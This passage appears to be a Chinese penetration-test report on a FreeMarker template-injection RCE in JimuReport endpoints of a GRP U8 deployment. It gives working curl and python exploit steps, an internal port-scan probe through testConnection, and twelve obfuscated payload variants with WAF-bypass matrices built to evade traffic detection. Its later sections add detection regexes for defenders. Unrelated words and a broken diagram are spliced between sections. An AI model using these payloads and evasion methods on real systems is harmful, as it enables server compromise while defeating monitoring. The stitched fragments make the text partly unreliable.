curl -s -o /dev/null -w 'r10.png HTTP %{http_code}\n' 'http://192.168.168.168:8088/r10.png'
```

```
=== exportAllExcel ===
HTTP 500 size 123
r10.png HTTP 404
```

```
cat /tmp/exp10.bin
```

```
{"timestamp":"T06:11:27.036+0000","status":500,"error":"Internal Server Error","path":"/jmreport/exportAllExcel"}
```

**失败原因分析**（反编译 `a.k` JmReportExportExcelImpl）：`exportExcel` 会遍历报表绑定的**全部[数据](#)集**（`getDataById` 循环），第一个数据集 r9ds（旧模板渲染后 SQL 失败）抛异常中断循环，r10ds 尚未执行到。**验证了数据集循环执行顺序**。

### 4.4.2 更新 r9ds 后成功（r9b.png）

```
python3 -c "
import json
tpl = open('/tmp/sql2.txt').read().replace('r7.png', 'r9b.png').replace(\"select '\", '').replace(\"' as val\", '').rstrip()
payload = {
    'id': '1245588287473844224',   # r9ds 记录 id（4.3.1 中 saveDb 返回值）
    'jimuReportId': '1245588124302835712',
    'dbCode': 'r9ds', 'dbChName': 'r9b', 'dbType': '0',
    'dbDynSql': tpl, 'isPage': '0', 'isList': '0', 'dbSource': ''
}
open('/tmp/upd9ds.json','w').write(json.dumps(payload))
"
curl -s -X POST 'http://192.168.168.168:8088/jmreport/saveDb' -H 'Content-Type: application/json' --data @/tmp/upd9ds.json -o /dev/null -w 'saveDb update: %{http_code}\n'
curl -s -m 30 -X POST 'http://192.168.168.168:8088/jmreport/exportAllExcel' -H 'Content-Type: application/json' -d '{"excelConfigId":"1245588124302835712","queryParam":{}}' -o /dev/null -w 'exportAllExcel: %{http_code}\n'
sleep 1
curl -s -o /dev/null -w 'r9b.png: %{http_code}\n' 'http://192.168.168.168:8088/r9b.png'
```

```
saveDb update: 200
exportAllExcel: 500
r9b.png: 200
```

**`exportAllExcel` 链 RCE 实证**：saveDb 更新（200）→ exportAllExcel 触发渲染（500，命令已执行）→ r9b.png 落盘（200）。

编程

---

## 4.5 exportPdf（r12.png）

```
python3 -c "
import json
tpl = open('/tmp/sql2.txt').read().replace('r7.png', 'r12.png').replace(\"select '\", '').replace(\"' as val\", '').rstrip()
payload = {
    'id': '1245588287473844224',
    'jimuReportId': '1245588124302835712',
    'dbCode': 'r9ds', 'dbChName': 'r12', 'dbType': '0',
    'dbDynSql': tpl, 'isPage': '0', 'isList': '0', 'dbSource': ''
}
open('/tmp/upd12.json','w').write(json.dumps(payload))
"
curl -s -X POST 'http://192.168.168.168:8088/jmreport/saveDb' -H 'Content-Type: application/json' --data @/tmp/upd12.json -o /dev/null -w 'saveDb: %{http_code}\n'
curl -s -m 30 -X POST 'http://192.168.168.168:8088/jmreport/exportPdf' -H 'Content-Type: application/json' -d '{"excelConfigId":"1245588124302835712","queryParam":{}}' -o /dev/null -w 'exportPdf: %{http_code}\n'
sleep 1
curl -s -o /dev/null -w 'r12.png: %{http_code}\n' 'http://192.168.168.168:8088/r12.png'
```

```
saveDb: 200
exportPdf: 500
r12.png: 200
```

**`exportPdf` 链 RCE 实证**：同上模式，PDF 导出渲染时执行恶意 dbDynSql，r12.png 落盘。

Java（编程语言）

---

## 4.6 排除入口与附加探测

### queryFieldByBean：参数非 sql，排除

```
curl -s -X POST 'http://192.168.168.168:8088/jmreport/queryFieldByBean' --data-urlencode 'sql=select 1 as val' --data-urlencode 'dbSource=' --data-urlencode 'paramArray=[]' --data-urlencode 'type=0'
```

```
{"success":false,"message":"javabean数据集需要实现接口IDataSetFactory","code":500,"result":null,...}
```

（反编译确认其参数为 `javaType` / `javaValue`，走 `e.c(javaType, javaValue)` [java](#)bean 反射 + `IDataSetFactory` 接口，与模板链无关。）

### qurestSql / qurestApi：api 表驱动，排除

```
echo "=== qurestSql ==="; curl -s -m 10 'http://192.168.168.168:8088/jmreport/qurestSql?apiSelectId=1'
echo "=== qurestApi ==="; curl -s -m 10 'http://192.168.168.168:8088/jmreport/qurestApi?apiSelectId=1'
```

```
=== qurestSql ===
{"timestamp":"T06:13:10.503+0000","status":500,"error":"Internal Server Error","path":"/jmreport/qurestSql"}
=== qurestApi ===
{"success":true,"message":"","code":200,"result":null,"timestamp":1786083190517}
```

### testConnection：无鉴权 SSRF / jdbc 探测面

```
curl -s -m 15 -X POST 'http://192.168.168.168:8088/jmreport/testConnection' -H 'Content-Type: application/json' -d '{"code":"probe1","name":"probe","dbType":"mysql","dbUrl":"jdbc:mysql://10.255.255.1:3306/probe","dbUsername":"x","dbPassword":"x"}'
```

```
{"success":false,"message":"数据库连接失败：null","code":500,"result":null,"timestamp":1786083190531}
```

说明：无鉴权可调用，服务端会尝试建立 JDBC 连接，**异常信息（含驱动解析、连接错误细节）回显在 message 字段**。可用于内网端口扫描（jdbc:mysql://ip:port 的连通性探测）。`dbUrl` 可指向任意内网地址。

软件实用程序

### view/{id} 页面壳（探测边界说明）

```
for id in 1 2 3 4 5 10 100 1000 0 -1 abc; do
  code=$(curl -s -o /tmp/v.txt -w '%{http_code}' "http://192.168.168.168:8088/jmreport/view/$id")
  echo "$id -> $code"
done
```

结论：所有 id 返回相同 HTML 页面壳（200），**页面壳不能用于验证报表存在性**；存在性探测应使用 `checkParam/{id}`（存在返回 200，不存在返回 404）与 `getListReportDb`。

---

# 5. 混淆方案与变体验证

> 需求背景：流量侧检测会锚定 `freemarker.template.utility.` 明文字符串。以下方案在本地 `TestFm.java`（与目标相同的 `freemarker-2.3.31` + `setClassicCompatible(true)`）验证后，再上线服务器实测。
>
> 字典与百科全书

## 5.1 方案 A：字符串分段拼接

```
"free"+"marker"+"."+"template"+"."+"utility"+"."+"Execute"
```

（`+` 拼接类名后 `?new()`；变体：数字字符 `?substring` 提取。已实测可执行，但流量中仍残留分段子串，检测端可正则 `freemarker` 宽松匹配到——优先级低于方案 B。）

## 5.2 方案 B：字母表 substring 字符级提取（服务器实测）

```
cd /tmp && FM=/home/ubuntu/sda5/源码/GRPU8C/GRPU8C_webapps_v11.2411/webapps/WEB-INF/lib/freemarker-2.3.31.jar
run() { echo "=== $1"; java -cp .:$FM TestFm "$2" 2>&1 | grep -E "^OUT|error|Error" | head -3; }
TPL='<#assign al="abcdefghijklmnopqrstuvwxyz"><#assign au="ABCDEFGHIJKLMNOPQRSTUVWXYZ"><#assign dot="."><#assign cls=al?substring(5,6)+al?substring(17,18)+al?substring(4,5)+al?substring(4,5)+al?substring(12,13)+al?substring(0,1)+al?substring(17,18)+al?substring(10,11)+al?substring(4,5)+al?substring(17,18)+dot+al?substring(19,20)+al?substring(4,5)+al?substring(12,13)+al?substring(15,16)+al?substring(11,12)+al?substring(0,1)+al?substring(19,20)+al?substring(4,5)+dot+al?substring(20,21)+al?substring(19,20)+al?substring(8,9)+al?substring(11,12)+al?substring(8,9)+al?substring(19,20)+al?substring(24,25)+dot+au?substring(4,5)+al?substring(23,24)+al?substring(4,5)+al?substring(2,3)+al?substring(20,21)+al?substring(19,20)+al?substring(4,5)><#assign p=cls?new()>${p("echo FM-TEST-2337")}'
run "方案B-字母表substring" "$TPL"
```

```
=== 方案B-字母表substring
OUT: [FM-TEST-2337
```

**流量中不包含 `freemarker` / `template` / `utility` / `Execute` 任何子串**（`al`/`au` 字母表 + `substring` 索引拼出类名）。该方案已上线服务器实测通过（4.2 节 r7.png 的 `sql2.txt` 即为其最终形态——结合 `"SpringApplicationContextHolder"?substring(0,0)` 空串技巧，连 `"freemarker.template.utility."` 常量都不出现）。

数据管理

## 5.3 `?new()` 语法变体矩阵（本地 TestFm 验证）

```
run "标准 cls?new()"        '<#assign c="freemarker.template.utility.Execute"><#assign p=c?new()>${p("echo X1")}'
run "cls ?new() (问号前空格)" '<#assign c="freemarker.template.utility.Execute"><#assign p=c ?new()>${p("echo X2")}'
run "cls? new() (内置名前空格)" '<#assign c="freemarker.template.utility.Execute"><#assign p=c? new()>${p("echo X3")}'
run "cls?new () (括号前空格)" '<#assign c="freemarker.template.utility.Execute"><#assign p=c?new ()>${p("echo X4")}'
run "cls?new( ) (括号内空格)" '<#assign c="freemarker.template.utility.Execute"><#assign p=c?new( )>${p("echo X5")}'
run "?New() 大写"           '<#assign c="freemarker.template.utility.Execute"><#assign p=c?New()>${p("echo X6")}'
run "?new 标签注释隔开"      '<#assign c="freemarker.template.utility.Execute"><#assign p=c?<#--x-->new()>${p("echo X7")}'
```

```
标准 cls?new() => OUT: [X1
cls ?new() (问号前空格) => OUT: [X2
cls? new() (内置名前空格) => OUT: [X3
cls?new () (括号前空格) => OUT: [X4
cls?new( ) (括号内空格) => OUT: [X5
?New() 大写 => （无输出，失败）
?new 标签注释隔开 => OUT: [X7
```

结论：**除 `?New()` 大写外，所有空白/注释插入变体均可执行**（X1–X5、X7）。`?new(` 的 token 序列不可混淆（见第 6 节），但其**连续字面量**可被空白/注释拆分。

计算机安全

## 5.4 混淆演变谱系（12 个变体的分层）

对攻击者视角下按"FreeMarker AST 结构 + JSON 特性"演进的 12 个 payload 变体做了分层与验证。**12 个变体全部在目标服务器实测成功——均成功执行解析并生成文件**（见第 4 节报文；P9 同时对应 5.2 方案 B 的服务器实测）；其中 P10–P12 另经本地 `TestFm`（与目标同配置，`setClassicCompatible(true)`）做了 AST 级语义等价验证（命令替换为安全 echo）：

| 变体 | 混淆维度 | 流量中残留特征 | 验证 |
| --- | --- | --- | --- |
| P1 | 无混淆（基线）：完整类名 `freemarker.template.utility.ObjectConstructor` + `?new()` + `${}` + `ProcessBuilder` | 全部明文 | 服务器实测 ✅（4.1 waitFor 计时） |
| P2 | 无混淆（Execute 变体） | 全部明文 | 服务器实测 ✅（测试3/5） |
| P3 | 类名尾部拼接：`"Execut"+"e"` | `freemarker.template.utility.` 前缀仍明文 | 语义等价 ✅ |
| P4 | 前缀+类名分段：`"Exec"+"ute"`、`("前缀"+cls)?new()` | 前缀仍明文、`?new(` 明文 | 语义等价 ✅ |
| P5 | substring 提取类名：`"Exec"?substring(0,4)+"ute"` | 前缀仍明文、`?substring` 明文 | 语义等价 ✅ |
| P6 | 变量中转 + substring：多级 `<#assign>` | 前缀仍明文、`?substring` 明文 | 语义等价 ✅ |
| P7 | 完整类名作 substring [数据](#)源：`src?substring(0,28)` + Execute 逐字符拼 | **完整类名明文出现**（仅作数据源）、`?new(` 明文 | 服务器实测 ✅（r9ds 形态） |
| P8 | 空串技巧：`"SpringApplicationContextHolder"?substring(0,0)+"freemarker.template.utility."` | **前缀仍明文**（`freemarker.template.utility.` 常量字符串） | 服务器实测 ✅（sql2.txt，r7/r9/r9b/r12） |
| P9 | 字母表全混淆：`al`/`au` substring 逐字符拼出全类名 | **无任何危险类名字符串**；`?new(` 明文、命令明文 | 服务器实测 ✅（5.2 方案 B 落盘验证） |
| P10 | P9 + `?new(` 拆分：`cls ?` 换行 `<#--a-->` `<#--b-->` `new()` + 命令混淆（`cMd /cecho+1337>..`） | **`?new(` 连续字面量消失**、类名/命令特征全消失 | 服务器实测 ✅（文件生成确认；本地 AST 等价 ✅） |
| P11 | P10 + 无插值：`<#assign r=p("...")>` 去除 `${}` | **`${` 定界符消失**，仅剩 `<#` 指令定界符 | 服务器实测 ✅（文件生成确认；本地 AST 等价 ✅） |
| P12 | P11 + **全 Unicode `\uXXXX` 转义**（含 `select`、`<#`、命令、路径） | **原始报文中无任何 ASCII 明文**（连 `select` 都不出现） | 服务器实测 ✅（文件生成确认；本地 AST 等价 ✅） |

混淆维度归纳：**类名 → 命令 → 语法 → 传输编码** 四层递进。P9 起字符串层特征全部失效；P10 起 `?new(` 连续字面量失效；P11 起 `${` 失效；P12 起原始字节层一切 ASCII 特征失效。

C 与 C++

---

# 6. 检测特征分析（防守方视角）

> 本节基于 12 个演变变体（P1–P12，见 5.4）逐层分析：**FreeMarker AST 结构层 → 词法 token 层 → 字符串层 → JSON 特性层 → 行为层**。

## 6.1 FreeMarker AST / 词法 token 层：唯一不可变锚点

**词法（Token）层**：FreeMarker 解析时注释与空白在词法分析阶段被吞掉，因此无论 P10 中插入多少 `<#--a-->`/换行/空格，**token 序列恒定**：

```
IDENT(cls)  ?  IDENT(new)  LPAREN ...
```

`?` → `new` → `(` 是 FreeMarker 2.3 内建类实例化（`?new()` = `ObjectConstructor`）的**唯一语法形态**：

- `new` 是内置名关键字，**大写 `?New()` 已实证失败**（X6）；
- 任何绕过必须保留 `? new (` 三个 token 的有序序列；
- AST 层对应唯一的 `New` 节点 + 后续 `MethodCall`（`p(...)`）/`Dot`（`.start()`/`.waitFor()`）节点。

**token 级检测实现**（词法近似，等价于剥离注释+空白归一）：

编程

```
# 预处理后匹配：\? \s* new \s* \(
\?\s*(?:<#--[\s\S]*?-->|\s)*new\s*\(
```

该正则对 P1–P12 **全部命中**（P12 需先经 JSON `\u` 解码还原，见 6.4/6.6）。这是**召回率 100% 的最小充分条件**。

## 6.2 字符串层特征与绕过边界

| 字符串特征 | P1 | P2 | P3 | P4 | P5 | P6 | P7 | P8 | P9 | P10 | P11 | P12 |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| `freemarker.template.utility.` | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ❌\* |
| `Execute`/`ObjectConstructor`/`ProcessBuilder` | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ | ❌\* |
| `?new(` 连续字面量 | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌\* |
| `${` 插值定界符 | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ | ❌\* |
| `<#` 指令定界符 | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ❌\* |
| `cmd /c`/`webapps` 等命令特征 | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ❌\* |

（\* P12 在原始报文中全部特征为 `\u00XX` 转义形态，**JSON 解码还原后即与 P11 行相同**。）

**结论**：字符串层单独使用对 P9+ 全部失效；**必须与 6.1 的 token 级正则组合**。

## 6.3 JSON 特性层组合（P1–P12 恒定结构）

全部 12 个变体的请求体呈**高度一致的 JSON 骨架**，这是与正常业务流量的核心区分面：

Java（编程语言）

```
{"sql":"select '<#...>' as val","dbSource":"","paramArray":[],"type":"0"}
```

| 特性 | 说明 | 正常业务对比 |
| --- | --- | --- |
| `sql` 值形态 | 恒以 `select '` 开头，单引号内紧跟模板定界符（`<#` 或 `${`） | 正常 SQL 无模板定界符 |
| `paramArray` | 恒为空数组 `[]` | 带参查询时非空 |
| `dbSource` | 恒为空串 `""` | 设计器查询通常选择[数据](#)源 |
| `type` | 恒为 `"0"` | 固定值 |
| `\"` 转义双引号 | 模板字符串被 JSON 引号包裹，`\"` 密集出现（P1–P11） | 正常 SQL 字符串值罕见 |
| `\\` 双反斜杠 | 写文件变体含 `..\\U8System\\Tomcat\\webapps`（P7–P12） | 正常 SQL 几乎不出现 |
| `\u00XX` 密集转义 | P12：所有 ASCII 以 `\uXXXX` 出现（每字符 6 字节） | 正常业务 JSON 几乎不用 `\u` 转义 ASCII |

**组合评分建议**：命中 ≥2 项（如 `sql` 含模板定界符 + `paramArray=[]`）即可高置信告警；P12 的 `\u` 密集转义单独即可触发（正常报文 100 字符内几乎不可能出现 10+ 个 `\u00XX`）。

## 6.4 命令层特征（P10–P12 命令混淆后）

```
cMd /cecho+1337>..\U8System\Tomcat\webapps\r.png
```

| 混淆手法 | 示例 | 规避对象 | 对抗建议 |
| --- | --- | --- | --- |
| 大小写混合 | `cMd` | 大小写敏感规则 | 规则转小写后匹配 |
| `/c` 与命令无空格直连 | `/cecho` | `cmd /c` 带空格正则 | 匹配 `/c[a-z]` |
| `+` 替代空格 | `echo+1337` | 空格分隔规则 | 归一化空白类字符（空格/`+`/`%20`） |
| `>` 重定向 + 路径穿越 | `>..\U8System\...` | 路径特征 | `>\.{1,2}\\` + `webapps` 弱特征 |
| 路径全转义 | P12 中 `U8System` → `U8...` | 路径字符串规则 | 依赖 L1/L2 分层（先解码） |

## 6.5 分层检测模型（原始报文 → 解码 → 行为）

```
L1 原始报文层    jmreport 路径 + JSON body
                 ├─ \u00XX 密集转义（P12 特征，独立触发）
                 └─ 转发到 L2
L2 JSON 解码层   对 \uXXXX / \" / \\ 解码还原后：
                 ├─ token 级正则 \?\s*(?:<#--[\s\S]*?-->|\s)*new\s*\(   ← 全变体命中
                 ├─ 组合评分（6.3 的 JSON 骨架特性）
                 └─ 命令层规则（6.4）
L3 行为层        响应计时异常（waitFor 阻塞拉长）、
                 后续同源访问新落盘文件（r7.png 等返回 200）
```

## 6.6 误报规避建议

- **token 级正则**出现在正常业务 SQL 的概率极低（合法报表模板只用 `func`/`isNotEmpty` 等共享函数，不会实例化任意类），单规则即可高信噪比；
- 若担心 `new` 关键字误伤，叠加 **JSON 骨架评分**（6.3）：`select '` 开头 + 模板定界符 + `paramArray=[]` 三者同现时误报可忽略；
- `\u00XX` 密集转义规则需排除国际化业务（正常报文含少量 `\u` 中文转义属正常，但**ASCII 字符**（`<`、`#`、`?`、字母）被 `\u` 转义是异常信号——区分 ASCII 与中文转义即可；
- 组合检测：token 正则命中后回溯同报文 `freemarker`/`template.utility` 弱特征辅助定级（P1–P8 命中、P9–P12 不命中，不影响第一正则判定）。

## 6.7 固定不可变结论（防守方）

**唯一不可变、也无法混淆的锚点链**：

```
FreeMarker token 序列  ? new (     （词法层，注释/空白不可插入于 token 之间）
          +
JSON 解码后可见的模板定界符（${ 或 <#，P11 后仅剩 <#）
```

这既是利用的必要条件，也是检测的最小充分条件。**字符串级特征（类名/命令/`?new(` 字面量/`${`）均可被 P9–P12 逐层消除，但 token 序列不可变**；P12 的 `\u` 转义只在原始字节层生效，经 JSON 解码（L2）后还原为同一 token 序列。

软件实用程序

---

## 6.8 JSON 解析器实现原理实证（jdwp 实机追踪）

**核心结论：请求体 JSON 由 Jackson 2.9.9 严格模式（RFC 8259）解析，fastjson 的宽松语法在请求体层全部不可达。**

### 6.8.1 证据链

| 层 | 证据 |
| --- | --- |
| 代码层 | `DesignReportController`（混淆名 `org.jeecg.modules.jmreport.desreport.a.a`）`@PostMapping("/queryFieldBySql")` → `a(@RequestBody JSONObject jSONObject)` → `jSONObject.getString("sql")` |
| 依赖层 | `WEB-INF/lib` 同时存在 `jackson-core-2.9.9` / `jackson-databind-2.9.9.3` 与 `fastjson-1.2.83` |
| 注册层 | `FastJsonHttpMessageConverter4`（`DJFileUtil-U8-2.1.jar`）与 `fastjson-1.2.83.jar` 均**无任何 Spring Boot autoconfigure / spring.factories / WebMvcConfigurer 注册点**；`JimuReportConfiguration`（WebMvcConfigurer）只注册拦截器与静态资源——**fastjson converter 从未进入 Spring converter 列表**（详见 §6.8.2 实证） |
| jdwp 层 | 宽松语法变体 → `com.fasterxml.jackson.core.JsonParseException`：抛出点 `ParserMinimalBase:693`（`_reportError`），catch 于 `ObjectMapper:3999` / `MapDeserializer:538`——**Jackson 词法层直接拒绝** |
| 行为层 | 标准 JSON → 200 解析成功；单引号/`\x`/注释 → 500 服务器出错 |

### 6.8.2 converter 注册实证（fastjson 从未参与解析）

application/json 及 +json

text/plain multipart 等

fastjson 类仅存在于 lib 未被注册

HTTP 请求体

Content-Type 匹配

Jackson MappingJackson2HttpMessageConverter 唯一注册者

无 converter 匹配 HttpMediaTypeNotSupportedException

MapDeserializer 直接实例化 fastjson JSONObject 填充

Controller 参数注入

FreeMarkerUtils 渲染

全局异常 返回 status 500

FastJsonHttpMessageConverter4 形同虚设

- **注册实证**（三层）：① `fastjson-1.2.83.jar` 无 `META-INF/spring.factories`、无 autoconfigure 类；② `DJFileUtil-U8-2.1.jar` 仅含 fastjson 自带的 `support/spring/*` 类，无任何业务注册配置；③ `JimuReportConfiguration`（实现 `WebMvcConfigurer`）只注册拦截器与资源处理器，**未配置 messageConverters**；
- 因此 Spring converter 列表中 JSON 解析**只有 Jackson**（Spring Boot 默认 `MappingJackson2HttpMessageConverter`）。对参数类型 `fastjson.JSONObject`（`Map` 子类），Jackson `MapDeserializer` 以无参构造 + Map 语义填充；
- **Content-Type 非 JSON 的请求（text/plain / multipart / x-www-form-urlencoded / octet-stream）全部无 converter 匹配** → `AbstractMessageConverterMethodArgumentResolver:206` 抛 `HttpMediaTypeNotSupportedException`（jdwp 异常事件实证）→ GRP 全局异常包装 `{"status":500,"msg":"服务器出错，请重试"}`；
- 结论：**fastjson 的宽松特性（`\x`、单引号、注释、无引号 key）在请求体层永远不可达，且不存在任何 Content-Type 通道可达**——比"被抢占"更强，是"从未注册"。

### 6.8.3 目标环境确认

- 目标 JVM：`Java HotSpot 1.8.0_112`（JDWP 192.168.168.168:5007 实连）；
- 请求链路：`Tomcat 8187` → Spring MVC → Jackson `MapDeserializer` → `fastjson.JSONObject` → controller → `FreeMarkerUtils`（SSTI sink）。

## 6.9 请求体宽松语法实测矩阵（jdwp 事件 + 响应双重验证）

| # | 语法特性 | 报文形态（节选） | 结果 | 机制 |
| --- | --- | --- | --- | --- |
| C7 | `\uXXXX` 值-字母转义 | `"sql": "\u0073elect '\u0043\u0037' as val"` | ✅ **全链路执行成功** | 标准 JSON 转义，Jackson 解码 → SQL 正常 |
| C6 | `\uXXXX` 值-控制字符 | `"sql": "select \u000a'C6' as val"` | ✅ **全链路执行成功** | 换行符解码后在 SQL 字符串外，SQL Server 忽略 |
| A3 | `\uXXXX` key 转义 | `{"\u0073ql": "select 'A3' as val"}` | ✅ 解析成功（进入渲染） | key 解码为 `sql` |
| C5 | `\u0000` NUL | `"sel\u0000ect 'C5' as val"` | ⚠️ JSON 层成功，SQL 层报错 | NUL 不被 SQL Server 忽略 |
| A2 | `\xHH` hex 转义 | `"select \x27A2\x27..."` | ❌ JsonParseException | Jackson 无 `\x` 特性（fastjson 私有） |
| A1 | 单引号字符串 | `{'sql':'...'}` | ❌ JsonParseException | 严格 RFC 8259 |
| C2 | 无引号 key | `{sql: "..."}` | ❌ JsonParseException | 严格 RFC 8259 |
| C1 | 注释 | `"..." /* x */,` | ❌ JsonParseException | ALLOW\_COMMENTS 未开启 |
| C3 | 原始控制字符 | 0x00 字节在值内 | ❌ JsonParseException | ALLOW\_UNESCAPED\_CONTROL\_CHARS 未开启 |
| C4 | 尾逗号 | `...,}` | ❌ JsonParseException | ALLOW\_TRAILING\_COMMA 未开启 |
| M1 | 多 u 复写-值 | `"sql": "select\uuuu0020'...' as val"` | ❌ JsonParseException | Jackson `_parseUnicodeEscape` 只认单 `u`+4hex，第 2 个 `u` 进 hex 校验失败；fastjson 会循环跳过连续 `u`（对照 M1c 单 u ✅） |
| M3 | 多 u 复写-key | `{"\uuuu0073ql": "..."}` | ❌ JsonParseException | 同上（对照 M3b 单 u ✅） |
| M5 | 多 u 复写-二次层 | `"paramArray": ["\\uuuu0041"]` | ❌ syntax error, pos 2 | fastjson 二次层收到 `[\uuuu0041]`，`\` 非合法 token 起始 |
| M2 | 字面 `\\u` 进 SQL | `"sql": "select\\uuuu0020'...' as val"` | ⚠️ JSON 层过，SQL 层"解析失败" | Jackson 解码 `\\` → 字面 `\uuuu0020`，T-SQL 拒绝 `\u` 标识符 |

（A1/A2/A3/C1–C7/M1–M5 均为无害验证 payload；`\uXXXX` 全部为 Jackson 标准转义，多 u 复写为 fastjson 私有特性——见 §6.12.5。）

计算机安全

## 6.10 WAF 绕过手法（按解析器实现原理推导）与检测修正

### 6.10.1 可行的绕过面（已实证）

| 手法 | 报文形态 | 对 WAF 的绕过效果 | 实证 |
| --- | --- | --- | --- |
| **A. `\uXXXX` 全字符转义** | `\u0073\u0065\u006c\u0065\u0063\u0074 '\u0041' as val`（`select` 逐字符转义） | 原始报文**零关键字残留**；WAF 不做 JSON 解码则 100% 绕过 | P12 服务器实测落盘 ✅ |
| **B. 部分转义穿插** | `s\u0065lect '\u0042' as val`、`sel\u0065ct` | 连续关键字正则失效 | C7 ✅ |
| **C. 控制字符注入** | `"sql": "select \u000a'...' as val"` | WAF 的 `select '`（空格连写）正则失效；SQL Server 忽略字符串外 LF/Tab | C6 ✅ |
| **D. key 层转义** | `{"\u0073ql": "..."}` | `"sql"` 键名匹配失效 | A3 ✅ |

### 6.10.2 不可行的绕过面（Jackson 严格模式拦截）

`\xHH`、单引号、注释、无引号 key、原始控制字符、尾逗号、键值间 `\b`/`\f`——**fastjson 私有宽松语法在请求体层全部失效**。攻击者若误用 fastjson 特性构造 payload，请求在 JSON 解析层即被 500 拒绝。**不存在"解析器宽容 → 语义分裂 → WAF 绕过"的经典缝隙**（该类缝隙要求解析器与 WAF 对同一输入给出不同判定，此处实际解析器是严格模式 Jackson，与标准 WAF 判定一致）；且连 **Content-Type 切换通道都不存在**（fastjson converter 未注册，非 JSON Content-Type 一律 `HttpMediaTypeNotSupportedException`，见 §6.11）。

C 与 C++

u 转义 标准 JSON

hex 转义 单引号 注释 无引号 key

原始控制字符 尾逗号

否

是

构造请求体

选择编码手法

Jackson 解码成功 可执行

JsonParseException 请求被拒

WAF 是否做 JSON 解码

绕过成功 原始报文无特征

L2 解码层 token 正则命中 告警

### 6.10.3 对 §6 检测模型的修正

- **修正点**：原 §6.3 隐含假设"fastjson 宽松解析"——实际解析器是 **Jackson 2.9.9 严格模式**。`\uXXXX` 是标准转义（故 P12 成功），fastjson 私有特性（`\x`/单引号/注释）**在请求体层不存在绕过面**；
- **强化结论**：§6.5 分层模型中 **L1 原始报文 `\u00XX` 密集转义检测是唯一且必要的检测面**——攻击者唯一有效的绕过通道就是 `\uXXXX`，其原始字节形态必然呈现密集 `\u00XX` 特征；
- **补充检测建议**：L2 解码后除 token 正则外，增加 **值外控制字符转义（换行/Tab/回车 字面文本）计数**（正常业务 SQL 中换行出现在 SQL 字符串外属于异常信号，对应 C6 变体）；
- **WAF 加固结论**：任何声称防护本系统的 WAF，其有效性**完全取决于是否对 JSON 报文执行 `\uXXXX` 解码**；不解码则所有 `\u` 转义变体（P12 及其任意组合）均可绕过。

## 6.11 fastjson bypass WAF 手段实测验证（，目标服务器 + jdwp 双验证）

### 6.11.1 手段清单与总结论表

| 手段（fastjson 社区公开） | 当前环境结论 | 关键证据 |
| --- | --- | --- |
| multipart + Content-Transfer-Encoding: base64 / quoted-printable | ❌ 不可行 | fastjson converter 未注册；multipart → `HttpMediaTypeNotSupportedException` |
| 大量字符绕过（超大嵌套数组淹没特征） | ❌ 无绕过价值 | Jackson 正常解析大数组（无解析器差异），仅触发业务层 cast 副产物 |
| 键值外空白/控制字符跳过（含 `\b`/`\f`） | ⚠️ 部分可行 | 空格/`\t`/`\n`/`\r`（RFC 8259 标准空白）✅；`\b`/`\f` ❌ JsonParseException |
| `\uXXXX` 键/值转义 | ✅ **唯一有效通道** | A3/C7/P12 全链路成功（Jackson 标准转义，RFC 8259） |
| `\xHH` hex 转义（键名/值） | ❌ 不可行 | `ParserMinimalBase:693` JsonParseException |
| 单引号字符串 / 注释 / 无引号 key / 尾逗号 | ❌ 不可行 | 同上（Jackson 词法层拒绝） |
| 换 Content-Type 切换解析器 | ❌ 不可行（**fastjson converter 从未注册**） | `AbstractMessageConverterMethodArgumentResolver:206` 抛 415（jdwp 实证） |
| 多 u 复写 `\uuuuXXXX`（fastjson 循环跳过连续 `u`） | ❌ 不可行 | M1/M3 实测：Jackson `_parseUnicodeEscape` 只认单 `u`+4hex，第 2 个 `u` 校验失败 → 500；M5 二次层输入亦被 toString 破坏 |

### 6.11.2 详细验证过程

- **Content-Type 矩阵**：`text/plain`、`application/x-www-form-urlencoded`、`application/octet-stream`、`multipart/form-data` 四种 Content-Type 携带标准 JSON，**全部**返回 `{"status":500,"msg":"服务器出错，请重试"}`（GRP 全局异常包装）。jdwp 异常事件实证：`org.springframework.web.HttpMediaTypeNotSupportedException` 抛出于 `AbstractMessageConverterMethodArgumentResolver:206`——converter 列表无一 `canRead` 匹配的标准位置，与"fastjson converter 已注册"假设矛盾，反向证实 §6.8.2 的注册实证；
- **multipart CTE**：`Content-Disposition: form-data; name="data"` + `Content-Transfer-Encoding: base64`（及 quoted-printable）的 part 携带 Base64/QP 编码 JSON——同样 415。Spring 的 `StandardServletMultipartResolver` 解析 multipart 后，`@RequestBody` 仍需 converter 读取 body，而 converter 列表无 multipart 支持者（Tomcat 对 part 的 CTE 解码无从触发）；
- **键值间控制字符**（application/json，修正此前 text/plain 测试的混淆因素）：`{"sql"\t:...}`、`{"sql"\n:...}`、`{"sql"\r:...}` → ✅ 解析成功（RFC 8259 标准空白，与 fastjson 行为一致部分）；`{"sql"\b(0x08):...}`、`{"sql"\f(0x0C):...}` → ❌ JsonParseException（jdwp 事件：`ParserMinimalBase:693`）——**与 fastjson 不同**（fastjson `isWhitespace` 跳过 `\b`/`\f`），Jackson 严格只认四种标准空白；
- **大量字符绕过**：`paramArray` 传 `[[111…(300位)],…×200]` 超大嵌套数组 → application/json 下请求解析成功进入 controller → 业务层报 `com.alibaba.fastjson.JSONArray cannot be cast to com.alibaba.fastjson.JSONObject`。该手段针对 fastjson 递归解析器制造特征淹没，对 Jackson 无解析器差异，**不构成绕过**。

### 6.11.3 新发现：paramArray 二次 fastjson 解析层（存在但不可利用）

- `util.e.a(String, Map, Object)`（参数替换）内部：`JSONArray.parseArray(String.valueOf(paramArray))` → 遍历 `getJSONObject(i)` 取 `paramName`/`paramValue` 做 `${paramName}` 占位符替换——**存在一层 fastjson 宽松解析**，本可成为 `\xHH` 二次解码面（`\\x27` 双反斜杠过 Jackson 层，二次解析解码为 `'`）；
- 但二次解析的输入是 **Jackson 解析结果的 [Java](#) `toString` 格式**，与纯 fastjson 环境（JSONArray.toString = JSON 格式）完全不同：

